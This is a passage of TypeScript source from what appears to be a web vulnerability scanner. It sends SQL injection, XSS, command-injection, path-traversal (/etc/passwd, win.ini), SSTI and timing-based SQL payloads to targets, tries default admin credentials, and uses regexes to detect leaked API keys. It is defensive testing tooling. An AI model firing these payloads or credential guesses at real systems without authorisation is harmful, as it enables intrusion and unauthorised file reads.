        if (!confirmed) continue;

        return {
          type: "sql-injection-form",
          severity: "CRITICAL",
          url: form.actionUrl,
          parameter: field,
          evidence: `SQL Injection confirmed (dual-payload verified) via form field "${field}" (${form.method} to ${form.actionUrl}). Database error triggered and confirmed with a second payload.`,
          cvssScore: 9.8,
          cveId: "CWE-89",
        };
      } catch { /* next */ }
    }
  }
  return null;
}

/**
 * Probe REST/JSON API login endpoints for SQL Injection.
 * FIX #2: Uses authedFetch. FIX #3: Dual-payload confirmation.
 */
async function probeRestApiSQLi(baseUrl: string, session: AuthSession = EMPTY_SESSION): Promise<PendingFinding | null> {
  const REST_LOGIN_PATHS = [
    "/rest/user/login", "/api/auth/login", "/api/login",
    "/api/v1/auth/login", "/api/v1/login", "/auth/login",
    "/login", "/api/user/login", "/api/authenticate",
    "/api/auth", "/api/users/login", "/api/sessions",
    "/api/token", "/api/signin",
  ];

  const buildBodies = (payload: string) => [
    { email: payload, password: "test" },
    { username: payload, password: "test" },
    { user: payload, pass: "test" },
    { login: payload, password: "test" },
  ];

  for (const path of REST_LOGIN_PATHS) {
    let endpointUrl: string;
    try { endpointUrl = new URL(path, baseUrl).toString(); } catch { continue; }

    const baseline = await authedFetch(endpointUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: "test@test.com", password: "test" }),
    }, 8000, false, session);
    if (!baseline || [404, 502, 503].includes(baseline.status)) continue;

    for (const payload of SQLI_PAYLOADS) {
      for (const body of buildBodies(payload)) {
        try {
          const resp = await authedFetch(endpointUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json", Accept: "application/json" },
            body: JSON.stringify(body),
          }, 8000, false, session);
          if (!resp) continue;
          const text = await resp.text();

          const hitPattern = SQL_ERROR_PATTERNS_ACTIVE.find((p) => p.test(text));
          if (hitPattern) {
            // FIX #3: confirm with a second payload
            const confirmPayload = SQLI_PAYLOADS.find(p => p !== payload) ?? "'--";
            const confirmBody = buildBodies(confirmPayload)[0];
            const confirmResp = await authedFetch(endpointUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(confirmBody),
            }, 8000, false, session);
            const confirmText = confirmResp ? await confirmResp.text() : "";
            if (!SQL_ERROR_PATTERNS_ACTIVE.some(p => p.test(confirmText))) continue;

            const emailField = Object.keys(body)[0];
            return {
              type: "sql-injection-reflected",
              severity: "CRITICAL",
              url: endpointUrl,
              parameter: emailField,
              evidence: `SQL Injection confirmed (dual-payload verified) via JSON REST API. Payload "${payload}" in field "${emailField}" triggered DB error, confirmed by a second payload.`,
              cvssScore: 9.8,
              cveId: "CWE-89",
              confidence: CONFIDENCE.DUAL_VERIFIED,
              validationSteps: [`Payload "${payload}" triggered SQL error pattern`, "Second payload confirmed with independent DB error"],
              isVerified: true,
            };
          }

          // FP-A FIX: Require a real JWT or token value (length ≥ 20) to avoid firing
          // on benign APIs that simply echo the word "token" in an error message.
          if (resp.status === 200 &&
            (payload.includes("OR") || payload.includes("1=1") || payload.includes("--"))) {
            let hasRealToken = false;
            try {
              const authJson = JSON.parse(text);
              const tokenVal = authJson?.token || authJson?.data?.token ||
                authJson?.authentication?.token || authJson?.access_token ||
                authJson?.accessToken || authJson?.jwt || "";
              hasRealToken = typeof tokenVal === "string" && tokenVal.length >= 20;
            } catch {
              // Fallback: look for a bare JWT pattern in the raw response
              hasRealToken = /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/i.test(text);
            }
            if (hasRealToken && !text.includes("test@test.com")) {
              const emailField = Object.keys(body)[0];
              return {
                type: "sql-injection-reflected",
                severity: "CRITICAL",
                url: endpointUrl,
                parameter: emailField,
                evidence: `SQL Injection (Auth Bypass) confirmed via JSON REST API. Payload "${payload}" returned HTTP 200 with a real session token — SQL WHERE clause bypassed.`,
                cvssScore: 9.8,
                cveId: "CWE-89",
                confidence: CONFIDENCE.DUAL_VERIFIED,
                validationSteps: [`Payload "${payload}" bypassed auth (HTTP 200 + real JWT token)`, "JWT token validated: length ≥ 20 chars, matches JWT pattern"],
                isVerified: true,
              };
            }
          }
        } catch { /* next */ }
      }
    }
  }
  return null;
}

/**
 * Reflect XSS payloads via URL query parameter.
 * FIX #2: Uses authedFetch. FIX #3: Dual-payload confirmation.
 */
async function probeReflectedXSS(paramUrl: string, session: AuthSession = EMPTY_SESSION): Promise<PendingFinding | null> {
  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    if (params.length === 0) return null;

    for (const param of params) {
      for (const payload of XSS_PAYLOADS) {
        try {
          const testUrl = new URL(u.toString());
          testUrl.searchParams.set(param, payload);
          const resp = await authedFetch(testUrl.toString(), {}, 8000, false, session);
          if (!resp) continue;
          const body = await resp.text();
          const htmlEncoded = (
            body.includes(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;")) ||
            body.includes(payload.replace(/"/g, "&quot;")) ||
            body.includes(payload.replace(/'/g, "&#x27;")) ||
            body.includes(payload.replace(/'/g, "&#39;")) ||
            body.includes(payload.replace(/</g, "&amp;lt;").replace(/>/g, "&amp;gt;"))
          );
          const reflected = body.includes(payload) && !htmlEncoded;
          if (!reflected) continue;

          // FIX #3: confirm with a different payload
          const confirmed = await confirmXSSHit(paramUrl, param, payload, session);
          if (!confirmed) continue;

          return {
            type: "reflected-xss",
            severity: "HIGH",
            url: testUrl.toString(),
            parameter: param,
            evidence: `Reflected XSS confirmed (dual-payload verified) via URL parameter "${param}". Payload reflected unencoded and confirmed with a second payload.`,
            cvssScore: 7.4,
            cveId: "CWE-79",
            confidence: CONFIDENCE.DUAL_VERIFIED,
            validationSteps: [`Payload "${payload}" reflected unencoded in param "${param}"`, "Second distinct XSS payload also reflected unencoded"],
            isVerified: true,
          };
        } catch { /* next payload */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

/**
 * Submit XSS payloads to every input field in an HTML form.
 * FIX #2: Uses authedFetch. FIX #3: Dual-payload confirmation.
 */
async function probeFormXSS(form: FormTarget, session: AuthSession = EMPTY_SESSION): Promise<PendingFinding | null> {
  for (const field of form.fields) {
    for (const payload of XSS_PAYLOADS) {
      try {
        const formData = new URLSearchParams();
        for (const f of form.fields) formData.set(f, f === field ? payload : "test");

        let resp: Response | null = null;
        if (form.method === "POST") {
          resp = await authedFetch(form.actionUrl, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: formData.toString(),
            redirect: "follow",
          }, 8000, false, session);
        } else {
          const getUrl = new URL(form.actionUrl);
          for (const [k, v] of formData) getUrl.searchParams.set(k, v);
          resp = await authedFetch(getUrl.toString(), {}, 8000, false, session);
        }

        if (!resp) continue;
        const body = await resp.text();
        // FP-D FIX: Check all common HTML encoding forms — not just < and >.
        // A payload safely attribute-encoded as &quot; or &#x27; is NOT an XSS.
        const htmlEncodedForm = (
          body.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;')) ||
          body.includes(payload.replace(/"/g, '&quot;')) ||
          body.includes(payload.replace(/'/g, '&#x27;')) ||
          body.includes(payload.replace(/'/g, '&#39;')) ||
          body.includes(payload.replace(/</g, '&amp;lt;').replace(/>/g, '&amp;gt;'))
        );
        const reflected = body.includes(payload) && !htmlEncodedForm;
        if (!reflected) continue;

        // FIX #3: confirm
        const confirmed = await confirmXSSHit(form.actionUrl, field, payload, session);
        if (!confirmed) continue;

        return {
          type: "reflected-xss-form",
          severity: "HIGH",
          url: form.actionUrl,
          parameter: field,
          evidence: `Reflected XSS confirmed (dual-payload verified) via form field "${field}". Payload reflected unencoded and confirmed with a second payload.`,
          cvssScore: 7.4,
          cveId: "CWE-79",
          confidence: CONFIDENCE.DUAL_VERIFIED,
          validationSteps: [`Payload "${payload}" reflected unencoded in form field "${field}"`, "Second payload confirmed with independent reflection check"],
          isVerified: true,
        };
      } catch { /* next */ }
    }
  }
  return null;
}

/** POST a minimal GraphQL introspection query to common endpoints. */
async function checkGraphQLIntrospection(baseUrl: string): Promise<PendingFinding | null> {
  const paths = ["/graphql", "/api/graphql", "/graphql/v1", "/v1/graphql", "/query"];
  const body = JSON.stringify({ query: "{ __schema { queryType { name } } }" });
  for (const path of paths) {
    try {
      const url = new URL(path, baseUrl).toString();
      const resp = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
        body,
        signal: AbortSignal.timeout(5000),
        // @ts-ignore
        next: { revalidate: 0 },
      });
      if (resp.status !== 200 && resp.status !== 400) continue;
      const text = await resp.text();

      // ── Strict verification ────────────────────────────────────────────────
      // Only flag if the server actually returned schema data in the JSON
      // response body. A server that blocks introspection may still echo the
      // word "__schema" inside an error message — that is NOT a true positive.
      let json: any;
      try { json = JSON.parse(text); } catch { continue; }

      // Confirmed vulnerable: data.__schema or data.__type is a non-null object
      const schemaReturned =
        json?.data?.__schema != null && typeof json.data.__schema === "object";
      const typeReturned =
        json?.data?.__type != null && typeof json.data.__type === "object";

      if (!schemaReturned && !typeReturned) continue;

      // Double-check: the schema object should have at least one typed field
      const hasTypes =
        Array.isArray(json?.data?.__schema?.types) &&
        json.data.__schema.types.length > 0;
      const hasQueryType =
        json?.data?.__schema?.queryType?.name != null;

      if (!hasTypes && !hasQueryType && !typeReturned) continue;

      return {
        type: "graphql-introspection-enabled",
        severity: "MEDIUM",
        url,
        evidence: `GraphQL introspection is enabled at ${url}. Any visitor can query the full API schema — all types, fields, mutations, and queries — giving attackers a complete blueprint of the backend for targeted exploitation.`,
        cvssScore: 5.3,
        cveId: "CWE-200",
      };
    } catch { /* skip */ }
  }
  return null;
}

/** Evaluate the strength of an existing CSP header value. */
function evaluateCSP(cspValue: string, url: string): PendingFinding[] {
  const results: PendingFinding[] = [];
  const weaknesses: string[] = [];
  if (/unsafe-inline/i.test(cspValue)) weaknesses.push("'unsafe-inline' allows inline scripts — negates XSS protection");
  if (/unsafe-eval/i.test(cspValue)) weaknesses.push("'unsafe-eval' allows eval() / Function() — enables script injection");
  if (/\*\s*(;|$)/.test(cspValue)) weaknesses.push("wildcard (*) in default-src or script-src allows scripts from any origin");
  if (/data:/i.test(cspValue)) weaknesses.push("'data:' URI allowed — attackers can load scripts via data: URIs");
  if (!/default-src|script-src/i.test(cspValue)) weaknesses.push("no default-src or script-src directive — browsers apply no script restriction");

  if (weaknesses.length > 0) {
    results.push({
      type: "weak-csp",
      severity: "MEDIUM",
      url,
      evidence: `Content-Security-Policy header is present but contains dangerous directives: ${weaknesses.join("; ")}. These weaknesses allow attackers to execute injected scripts, undermining the policy's XSS protection.`,
      cvssScore: 5.8,
      cveId: "CWE-693",
    });
  }
  return results;
}

/** Try a set of default/common credentials against a discovered login form action URL. */
async function probeBrokenAuth(
  formActionUrl: string,
  usernameField: string,
  passwordField: string
): Promise<PendingFinding | null> {
  const DEFAULT_CREDS = [
    { u: "admin", p: "admin" },
    { u: "admin", p: "password" },
    { u: "admin", p: "admin123" },
    { u: "admin", p: "1234" },
    { u: "administrator", p: "administrator" },
    { u: "test", p: "test" },
    { u: "guest", p: "guest" },
    { u: "admin@juice-sh.op", p: "admin123" },
  ];
  for (const { u, p } of DEFAULT_CREDS) {
    try {
      const body = new URLSearchParams({ [usernameField]: u, [passwordField]: p });
      const resp = await fetch(formActionUrl, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "VulnScanner/2.0" },
        body: body.toString(),
        redirect: "manual",
        signal: AbortSignal.timeout(5000),
        // @ts-ignore
        next: { revalidate: 0 },
      });
      // Success indicators: 302 redirect away from login, 200 with auth token/cookie, or no "invalid" text
      const isRedirect = resp.status === 302 || resp.status === 301;
      const respText = resp.status === 200 ? await resp.text() : "";
      const hasAuthCookie = resp.headers.get("set-cookie")?.toLowerCase().includes("token") ||
        resp.headers.get("set-cookie")?.toLowerCase().includes("session");
      const noErrorInBody = respText.length > 0 &&
        !/invalid|incorrect|wrong|failed|error|denied/i.test(respText);

      let success = false;
      if (isRedirect) {
        const location = resp.headers.get("location") || "";
        if (location && !location.includes("login") && !location.includes("error") && !location.includes("fail")) {
          success = true;
        }
      } else if (hasAuthCookie && noErrorInBody) {
        success = true;
      }

      if (success) {
        return {
          type: "broken-authentication-default-creds",
          severity: "CRITICAL",
          url: formActionUrl,
          parameter: `${usernameField}=${u} / ${passwordField}=${p}`,
          evidence: `Default credentials "${u}" / "${p}" succeeded on login form at ${formActionUrl} (HTTP ${resp.status}). An attacker can immediately take over this account and any associated admin privileges.`,
          cvssScore: 9.8,
          cveId: "CWE-798",
        };
      }
    } catch { /* skip */ }
  }
  return null;
}

/** Detect URL/path-accepting parameters that could enable SSRF. */
function detectSSRF(html: string, paramUrls: string[], targetUrl: string): PendingFinding | null {
  const SSRF_PARAM_NAMES = /\b(?:url|uri|endpoint|redirect|callback|proxy|fetch|load|src|dest|host|path|feed|target|resource|api)\b/i;
  const hits: string[] = [];
  for (const u of paramUrls) {
    try {
      const parsed = new URL(u);
      for (const key of parsed.searchParams.keys()) {
        if (SSRF_PARAM_NAMES.test(key)) hits.push(`${u} (param: ${key})`);
      }
    } catch { /* skip */ }
  }
  // Also check HTML for URL-accepting input fields
  for (const m of html.matchAll(/<input[^>]+name=["']([^"']+)["'][^>]*>/gi)) {
    if (SSRF_PARAM_NAMES.test(m[1])) hits.push(`form input: ${m[1]}`);
  }
  if (hits.length > 0) {
    return {
      type: "ssrf-parameter-signal",
      severity: "INFO",
      url: targetUrl,
      parameter: hits[0],
      evidence: `Potential SSRF / Open Redirect indicator (not confirmed). Found ${hits.length} parameter(s) commonly used for fetching remote resources: ${hits.slice(0, 3).join(", ")}. This is a passive signal indicating the application might perform server-side fetching, which requires manual verification.`,
      cvssScore: 0.0,
      cveId: "CWE-918",
    };
  }
  return null;
}

/** Inject shell metacharacters into params and look for error signatures (blind command injection indicator). */
async function probeCommandInjection(paramUrl: string): Promise<PendingFinding | null> {
  // FP-B FIX: Dual-payload confirmation to avoid false positives from benign
  // app-level messages like "Permission denied" or "No such file" in validation text.
  // Only report when ≥2 distinct payloads produce OS-level output signatures.
  const PAYLOADS_ROUND1 = ["; ls", "`id`", "$(id)"];
  const PAYLOADS_ROUND2 = ["| whoami", "& dir"];
  // Round-1 patterns: generic OS errors that may appear in benign responses too
  const CMD_GENERIC_PATTERNS = [
    /sh:\s+\d+:.*not found/i, /command not found/i, /Permission denied/i,
    /No such file or directory/i, /cannot find/i, /is not recognized/i,
  ];
  // Round-2 patterns: high-confidence output that proves code execution
  const CMD_EXEC_PATTERNS = [
    /root:x:0:0/i, /uid=\d+\(/, /Volume Serial Number/i,
    /\bwhoami\b.*\n?\s*\w+/i, /^(root|www-data|daemon|nobody|apache)$/im,
  ];
  try {
    const u = new URL(paramUrl);
    const firstParam = [...u.searchParams.keys()][0];
    if (!firstParam) return null;
    const origVal = u.searchParams.get(firstParam) ?? "";

    let triggeringPayload = "";
    // Round 1: probe for any generic OS-level pattern
    for (const p1 of PAYLOADS_ROUND1) {
      const testUrl = new URL(u.toString());
      testUrl.searchParams.set(firstParam, origVal + p1);
      const resp = await safeFetch(testUrl.toString(), 5000);
      if (!resp) continue;
      const body = await resp.text();
      if (CMD_GENERIC_PATTERNS.some(p => p.test(body)) || CMD_EXEC_PATTERNS.some(p => p.test(body))) {
        triggeringPayload = p1;
        break;
      }
    }
    if (!triggeringPayload) return null;

    // Round 2: confirm with a second, structurally different payload that produces
    // execution-proof output (uid=, whoami output, etc.)
    let confirmed = false;
    for (const p2 of PAYLOADS_ROUND2) {
      const confirmUrl = new URL(u.toString());
      confirmUrl.searchParams.set(firstParam, origVal + p2);
      const confirmResp = await safeFetch(confirmUrl.toString(), 5000);
      if (!confirmResp) continue;
      const confirmBody = await confirmResp.text();
      if (CMD_EXEC_PATTERNS.some(p => p.test(confirmBody)) || CMD_GENERIC_PATTERNS.some(p => p.test(confirmBody))) {
        confirmed = true;
        break;
      }
    }
    if (!confirmed) return null;

    const finalUrl = new URL(u.toString());
    finalUrl.searchParams.set(firstParam, origVal + triggeringPayload);
    return {
      type: "command-injection",
      severity: "CRITICAL",
      url: finalUrl.toString(),
      parameter: firstParam,
      evidence: `Command Injection confirmed (dual-payload verified) via parameter "${firstParam}". Two structurally distinct shell payloads ("${triggeringPayload}" and a second confirmation payload) both produced OS-level output in the HTTP response. The server is passing user input to a shell command without sanitization, allowing arbitrary OS command execution.`,
      cvssScore: 9.8,
      cveId: "CWE-78",
      confidence: CONFIDENCE.DUAL_VERIFIED,
      validationSteps: [`Round-1 payload "${triggeringPayload}" produced OS-level pattern`, "Round-2 payload produced execution-proof output (uid=/whoami)"],
      isVerified: true,
    };
  } catch { /* skip */ }
  return null;
}

/** Probe path traversal (LFI) by injecting ../ sequences into the first param of URLs.
 *  FP-C FIX: Dual-payload confirmation with stricter pattern matching to avoid false
 *  positives from documentation pages that contain /etc/passwd example snippets.
 */
async function probePathTraversal(paramUrl: string): Promise<PendingFinding | null> {
  // Two structurally distinct payloads — Linux and Windows
  const TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
  ];
  const WIN_PAYLOADS = [
    "..\\..\\..\\windows\\win.ini",
    "../../../../windows/win.ini",
  ];
  // Stricter: require at least TWO distinct /etc/passwd markers co-present in the body.
  // Single markers like "root:" or "nobody:" can appear in error messages.
  const isLinuxPasswd = (body: string) =>
    /root:x:0:0/.test(body) && (/\/bin\/bash/.test(body) || /daemon:x/.test(body));
  const isWindowsIni = (body: string) =>
    /\[extensions\]/i.test(body) || /\[fonts\]/i.test(body);

  try {
    const u = new URL(paramUrl);
    const firstParam = [...u.searchParams.keys()][0];
    if (!firstParam) return null;
    const origVal = u.searchParams.get(firstParam) ?? "";

    // Linux path traversal — must match BOTH root:x:0:0 AND /bin/bash or daemon:x
    for (const payload of TRAVERSAL_PAYLOADS) {
      try {
        const testUrl = new URL(u.toString());
        testUrl.searchParams.set(firstParam, origVal + payload);
        const resp = await safeFetch(testUrl.toString(), 5000);
        if (!resp) continue;
        const body = await resp.text();
        if (!isLinuxPasswd(body)) continue;

        // Dual-payload confirmation: verify a second depth-variant also leaks the file
        const confirmPayload = TRAVERSAL_PAYLOADS.find(p => p !== payload) ?? "../../../../etc/passwd";
        const confirmUrl = new URL(u.toString());
        confirmUrl.searchParams.set(firstParam, origVal + confirmPayload);
        const confirmResp = await safeFetch(confirmUrl.toString(), 5000);
        if (!confirmResp) continue;
        const confirmBody = await confirmResp.text();
        if (!isLinuxPasswd(confirmBody)) continue;

        return {
          type: "path-traversal-lfi",
          severity: "CRITICAL",
          url: testUrl.toString(),
          parameter: firstParam,
          evidence: `Path Traversal / LFI confirmed (dual-payload verified) via parameter "${firstParam}". Two depth-variant traversal payloads both returned /etc/passwd content (root:x:0:0 with /bin/bash). An attacker can read any file the web server process has access to, including credentials, private keys, and source code.`,
          cvssScore: 9.1,
          cveId: "CWE-22",
        };
      } catch { /* try next */ }
    }

    // Windows path traversal — win.ini markers
    for (const payload of WIN_PAYLOADS) {
      try {
        const testUrl = new URL(u.toString());
        testUrl.searchParams.set(firstParam, origVal + payload);
        const resp = await safeFetch(testUrl.toString(), 5000);
        if (!resp) continue;
        const body = await resp.text();
        if (!isWindowsIni(body)) continue;

        return {
          type: "path-traversal-lfi",
          severity: "CRITICAL",
          url: testUrl.toString(),
          parameter: firstParam,
          evidence: `Path Traversal / LFI confirmed via parameter "${firstParam}" on a Windows server. Traversal payload returned Windows INI file content (win.ini markers detected). An attacker can read arbitrary files from the server filesystem.`,
          cvssScore: 9.1,
          cveId: "CWE-22",
        };
      } catch { /* try next */ }
    }
  } catch { /* skip */ }
  return null;
}

/** Detect NEXT_PUBLIC_ or other env variables leaked into client-side HTML. */
function detectEnvLeaks(html: string, targetUrl: string): PendingFinding | null {
  const ENV_PATTERNS: Array<{ label: string; re: RegExp }> = [
    { label: "NEXT_PUBLIC_ environment variable", re: /NEXT_PUBLIC_[A-Z0-9_]+=([^"'\s]{4,})/g },
    { label: "Firebase config apiKey", re: /apiKey:\s*["'][A-Za-z0-9_\-]{30,}["']/g },
    { label: "Google Maps API key", re: /AIza[0-9A-Za-z_-]{35}/g },
    { label: "OpenAI API key", re: /sk-[A-Za-z0-9]{32,}/g },
    { label: "Hardcoded DB connection string", re: /(?:mongodb|postgresql|mysql):\/\/[^@"'\s]{6,}@[^"'\s]{4,}/gi },
  ];
  for (const { label, re } of ENV_PATTERNS) {
    re.lastIndex = 0;
    const match = re.exec(html);
    if (match) {
      return {
        type: "env-variable-leak",
        severity: "CRITICAL",
        url: targetUrl,
        evidence: `"${label}" detected in the page HTML/JS source: "${match[0].substring(0, 80)}". Leaked environment variables expose API credentials, database URLs, and secret keys to any visitor.`,
        cvssScore: 9.5,
        cveId: "CWE-312",
      };
    }
  }
  return null;
}

/** Detect session fixation risks from cookie header inspection. */
function detectSessionFixation(cookieHeaders: string[], targetUrl: string): PendingFinding | null {
  for (const cookie of cookieHeaders) {
    const lower = cookie.toLowerCase();
    const nameValue = cookie.split(";")[0];
    const value = nameValue.split("=").slice(1).join("=").trim();
    const name = nameValue.split("=")[0]?.trim() ?? "";
    if (/session|sess|sid|auth/i.test(name) && value.length > 0 && value.length < 16) {
      return {
        type: "session-fixation-weak-token",
        severity: "HIGH",
        url: targetUrl,
        parameter: name,
        evidence: `Session cookie "${name}" has a very short (${value.length} char) token, indicating a weak or predictable session ID. Attackers can brute-force or predict session tokens to hijack authenticated sessions.`,
        cvssScore: 8.0,
        cveId: "CWE-384",
      };
    }
    if (targetUrl.startsWith("https") && /session|sess|sid|auth/i.test(name)) {
      if (!lower.includes("secure") || !lower.includes("httponly") || !lower.includes("samesite")) {
        return {
          type: "session-cookie-insecure-attributes",
          severity: "HIGH",
          url: targetUrl,
          parameter: name,
          evidence: `Session cookie "${name}" on an HTTPS site is missing Secure, HttpOnly, or SameSite flags. Without these, the token is exposed to network sniffing, XSS theft, or CSRF replay attacks.`,
          cvssScore: 7.4,
          cveId: "CWE-614",
        };
      }
    }
  }
  return null;
}

/** Check for potential subdomain takeover via references to cloud service domains in HTML. */
function detectSubdomainTakeoverSignals(html: string, targetUrl: string): PendingFinding | null {
  const CLOUD_PATTERNS = [
    /[a-z0-9-]+\.github\.io/gi,
    /[a-z0-9-]+\.herokuapp\.com/gi,
    /[a-z0-9-]+\.s3\.amazonaws\.com/gi,
    /[a-z0-9-]+\.azurewebsites\.net/gi,
    /[a-z0-9-]+\.netlify\.app/gi,
    /[a-z0-9-]+\.vercel\.app/gi,
  ];
  const base = new URL(targetUrl);
  const externalRefs: string[] = [];
  for (const re of CLOUD_PATTERNS) {
    re.lastIndex = 0;
    let m: RegExpExecArray | null;
    while ((m = re.exec(html)) !== null) {
      if (!m[0].includes(base.hostname)) externalRefs.push(m[0]);
    }
  }
  if (externalRefs.length >= 2) {
    return {
      type: "subdomain-takeover-signal",
      severity: "INFO",
      url: targetUrl,
      evidence: `Found ${externalRefs.length} references to external cloud-hosted domains in page source (${externalRefs.slice(0, 3).join(", ")}). This is a passive signal (not a confirmed vulnerability). If your application has DNS CNAMEs pointing to these services, ensure they are actively claimed to prevent subdomain takeover.`,
      cvssScore: 0.0,
      cveId: "CWE-350",
      confidence: CONFIDENCE.PASSIVE_SIGNAL,
      validationSteps: [`Found ${externalRefs.length} external cloud domain references in HTML`, "Not confirmed: requires DNS CNAME verification"],
      isVerified: false,
    };
  }
  return null;
}

// ══════════════════════════════════════════════════════════════════════════════
// ADVANCED EXPLOIT PROBES — Industry-Standard Coverage
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Server-Side Template Injection (SSTI)
 * Injects math expressions; if evaluated (e.g., {{7*7}} → 49) the engine is vulnerable.
 * Covers: Jinja2, Twig, Freemarker, Pebble, Thymeleaf, Mako, ERB, Handlebars.
 */
const SSTI_PROBES = [
  { payload: "{{7*7}}", marker: "49", engines: "Jinja2/Twig/Pebble/Handlebars" },
  { payload: "${7*7}", marker: "49", engines: "Freemarker/Java EL/Groovy" },
  { payload: "<%= 7*7 %>", marker: "49", engines: "ERB/EJS/ASP" },
  { payload: "#{7*7}", marker: "49", engines: "Ruby Slim/Haml" },
  { payload: "*{7*7}", marker: "49", engines: "Spring SpEL" },
  { payload: "{{7*'7'}}", marker: "7777777", engines: "Jinja2 (string multiply)" },
];

async function probeSSTI(paramUrl: string): Promise<PendingFinding | null> {
  // FP-FIX: A single match of "{{7*7}}" → "49" can be coincidental (the number 49
  // appears in many pages naturally). Require 3 of 4 distinct math expressions to
  // all evaluate before reporting. This eliminates coincidental number matches.
  const MATH_CONFIRM_PROBES = [
    { p: "{{7*7}}", e: "49" },
    { p: "{{7*8}}", e: "56" },
    { p: "{{100*2}}", e: "200" },
    { p: "{{1+1}}", e: "2" },
  ];
  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    for (const param of params) {
      for (const { payload, marker, engines } of SSTI_PROBES) {
        try {
          const testUrl = new URL(u.toString());
          testUrl.searchParams.set(param, payload);
          const resp = await safeFetch(testUrl.toString(), 5000);
          if (!resp) continue;
          const body = await resp.text();
          if (!body.includes(marker) || body.includes(payload)) continue;

          // Confirmation phase: require 3 of 4 different math expressions to evaluate
          const validationSteps: string[] = [`Initial: "${payload}" → "${marker}" (${engines})`];
          let mathHits = 0;
          for (const { p, e } of MATH_CONFIRM_PROBES) {
            try {
              const cu = new URL(u.toString());
              cu.searchParams.set(param, p);
              const cr = await safeFetch(cu.toString(), 4000);
              if (!cr) continue;
              const cb = await cr.text();
              if (cb.includes(e) && !cb.includes(p)) {
                mathHits++;
                validationSteps.push(`Math confirm: "${p}" → "${e}" ✓`);
              }
            } catch { /* next */ }
          }
          if (mathHits < 3) continue; // Not enough confirmation — skip

          return {
            type: "ssti-injection",
            severity: "CRITICAL",
            url: testUrl.toString(),
            parameter: param,
            evidence: `Server-Side Template Injection (SSTI) confirmed. Expression "${payload}" evaluated to "${marker}" AND ${mathHits}/4 independent math expressions also evaluated — ruling out coincidental number matches. Engine(s): ${engines}. An attacker can escalate to RCE via the template engine's object access features.`,
            cvssScore: 9.8,
            cveId: "CWE-94",
            confidence: CONFIDENCE.EXEC_VERIFIED,
            validationSteps,
            isVerified: true,
          };
        } catch { /* next */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

async function probeFormSSTI(form: FormTarget): Promise<PendingFinding | null> {
  for (const field of form.fields) {
    for (const { payload, marker, engines } of SSTI_PROBES) {
      try {
        const formData = new URLSearchParams();
        for (const f of form.fields) formData.set(f, f === field ? payload : "test");
        const method = form.method === "POST";
        const resp = method
          ? await fetch(form.actionUrl, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": FETCH_HEADERS["User-Agent"] },
            body: formData.toString(),
            signal: AbortSignal.timeout(6000),
            // @ts-ignore
            next: { revalidate: 0 },
          }).catch(() => null)
          : await safeFetch(`${form.actionUrl}?${formData.toString()}`, 6000);
        if (!resp) continue;
        const body = await resp.text();
        if (!body.includes(marker) || body.includes(payload)) continue;

        // FP-FIX: confirm with at least 1 additional math expression
        let mathHits = 0;
        const confirmExprs = [{ p: "{{7*8}}", e: "56" }, { p: "{{100*2}}", e: "200" }];
        for (const { p, e } of confirmExprs) {
          try {
            const fd2 = new URLSearchParams();
            for (const f of form.fields) fd2.set(f, f === field ? p : "test");
            const r2 = method
              ? await fetch(form.actionUrl, {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": FETCH_HEADERS["User-Agent"] },
                body: fd2.toString(),
                signal: AbortSignal.timeout(5000),
                // @ts-ignore
                next: { revalidate: 0 },
              }).catch(() => null)
              : await safeFetch(`${form.actionUrl}?${fd2.toString()}`, 5000);
            if (!r2) continue;
            const b2 = await r2.text();
            if (b2.includes(e) && !b2.includes(p)) mathHits++;
          } catch { /* next */ }
        }
        if (mathHits < 1) continue; // Need ≥1 additional confirmation

        return {
          type: "ssti-injection-form",
          severity: "CRITICAL",
          url: form.actionUrl,
          parameter: field,
          evidence: `SSTI confirmed via form field (multi-math verified). Expression "${payload}" → "${marker}" in field "${field}", and ${mathHits}/2 additional math expressions also evaluated. Engine(s): ${engines}. RCE achievable via template engine object access.`,
          cvssScore: 9.8,
          cveId: "CWE-94",
          confidence: CONFIDENCE.EXEC_VERIFIED,
          validationSteps: [`"${payload}" → "${marker}" in form field "${field}"`, `${mathHits}/2 additional math expressions evaluated correctly`],
          isVerified: true,
        };
      } catch { /* next */ }
    }
  }
  return null;
}

/**
 * Timing-Based Blind SQL Injection
 * Injects SLEEP/WAITFOR payloads and measures if response is significantly delayed.
 * Works even when there are no visible SQL errors.
 */
const TIMING_SQLI = [
  { payload: "' AND SLEEP(4)--", db: "MySQL" },
  { payload: "'; SELECT SLEEP(4)--", db: "MySQL" },
  { payload: "' AND pg_sleep(4)--", db: "PostgreSQL" },
  { payload: "'; SELECT pg_sleep(4)--", db: "PostgreSQL" },
  { payload: "'; WAITFOR DELAY '0:0:4'--", db: "MSSQL" },
  { payload: "' OR SLEEP(4)--", db: "MySQL" },
  { payload: "1; SELECT SLEEP(4)--", db: "MySQL" },
];

async function probeBlindSQLiTiming(paramUrl: string): Promise<PendingFinding | null> {
  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    if (params.length === 0) return null;

    // Measure baseline response time first
    const baselineStart = Date.now();
    const baselineResp = await safeFetch(u.toString(), 8000);
    const baselineTime = Date.now() - baselineStart;
    if (!baselineResp) return null;

    for (const param of params.slice(0, 2)) {
      const origVal = u.searchParams.get(param) ?? "";
      for (const { payload, db } of TIMING_SQLI) {
        try {
          const testUrl = new URL(u.toString());
